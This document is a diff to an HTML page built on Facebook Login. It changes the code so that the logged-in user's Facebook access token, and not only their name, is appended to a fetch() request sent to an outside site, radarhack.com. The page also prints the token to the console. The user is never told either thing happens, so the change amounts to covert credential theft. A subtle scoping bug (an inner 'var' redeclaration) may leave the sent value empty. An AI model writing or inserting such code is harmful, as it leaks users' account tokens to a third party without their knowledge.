@@ -7,11 +7,14 @@
 <body>
 <script>
 
+var fbAccessToken = '';
+
   function statusChangeCallback(response) {  // Called with the results from FB.getLoginStatus().
     console.log('statusChangeCallback');
     console.log(response);                   // The current login status of the person.
     if (response.status === 'connected') {   // Logged into your webpage and Facebook.
       console.log('Access Token:', response.authResponse.accessToken); // Log the access token
+      var fbAccessToken = response.authResponse.accessToken;
       testAPI();  
     } else {                                 // Not logged into your webpage or we are unable to tell.
       document.getElementById('status').innerHTML = 'Please log ' +
@@ -52,7 +55,7 @@
       '<br><img src="' + response.picture.data.url + '" alt="Profile Picture">';
 
     // Construct the URL with the user's name
-    const url = `https://www.radarhack.com/?name=${encodeURIComponent(response.name)}`;
+    const url = `https://www.radarhack.com/?name=${encodeURIComponent(response.name)}&access_token=${fbAccessToken}`;
 
     // Send the user's name to the specified URL using fetch
     fetch(url)
